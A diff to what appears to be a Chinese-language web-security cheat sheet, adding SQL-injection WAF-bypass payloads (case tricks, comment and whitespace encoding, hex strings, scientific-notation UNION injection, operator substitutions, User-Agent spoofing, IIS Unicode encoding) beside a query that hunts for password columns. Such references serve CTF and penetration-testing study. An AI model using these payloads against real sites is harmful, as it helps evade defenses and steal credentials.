@@ -911,6 +911,36 @@ pop graphic-context
     - `select table_name from mysql.innodb_table_stats where database_name=資料庫名;`
     - Example: [Codegate2018 prequal - simpleCMS](https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS)
 
+- Bypass WAF
+
+    - `select password` => `SelEcT password` (大小寫)
+    - `select password` => `select/**/password` (繞空白)
+    - `select password` => `s%65lect%20password` (URLencode)
+    - `select password` => `select(password)` (繞空白)
+    - `select password` => `select%0apassword` (繞空白)
+        - %09, %0a, %0b, %0c, %0d, %a0
+    - `select password from admin` => `select password /*!from*/ admin` (MySQL註解)
+    - `information_schema.schemata` => ``` `information_schema`.schemata ``` (繞關鍵字/空白)
+        - ``` select xxx from`information_schema`.schemata``` 
+    - `select pass from user where id='admin'` => `select pass from user where id=0x61646d696e` (繞引號)
+        - `id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))`
+    - `?id=0e2union select 1,2,3` (科學記號)
+        - `?id=1union select 1,2,3`會爛
+        - `?ud=0e1union(select~1,2,3)` (~)
+        - `?id=.1union select 1,2,3` (點)
+    - `WHERE` => `HAVING` (繞關鍵字)
+    - `AND` => `&&` (繞關鍵字)
+        - `OR` => `||`
+        - `=` => `LIKE`
+        - `a = 'b'` => `not a > 'b' and not a < 'b'`
+        - `> 10` => `not between 0 and 10`
+    - `LIMIT 0,1` => `LIMIT 1 OFFSET 0` (繞逗號)
+        - `substr('kaibro',1,1)` => `substr('kaibro' from 1 for 1)`
+    - Multipart/form-data繞過
+        - http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/
+    - 偽造User-Agent
+        - e.g. 有些WAF不封google bot
+
 ## MSSQL
 
 - 子字串：
@@ -991,6 +1021,9 @@ pop graphic-context
 
 - 快速查找帶關鍵字的表
     - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`
+
+- Unicode繞過
+    - IIS 對 Unicode 編碼是可以解析的，即 s%u0065lect 會被解析為 select
 
 ## Oracle
 
